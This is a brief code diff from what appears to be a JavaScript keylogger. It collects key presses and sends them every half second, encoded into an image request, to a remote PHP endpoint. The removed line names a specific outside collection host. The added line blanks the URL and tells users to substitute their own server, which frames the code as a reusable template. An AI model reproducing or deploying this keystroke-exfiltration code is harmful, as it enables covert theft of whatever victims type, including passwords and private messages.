@@ -11,7 +11,7 @@ window.setInterval(function () {
     var data = encodeURIComponent(JSON.stringify(presses));
     //encodeURIComponent
     console.log(data);
-    new Image().src = "http://bedtt.epizy.com/gg/bedtt.php" + data; // CHANGE THIS URL TO YOUR OWN!
+    new Image().src = " " + data; // CHANGE THIS URL TO YOUR OWN!
     presses = [];
   }
 }, 500);
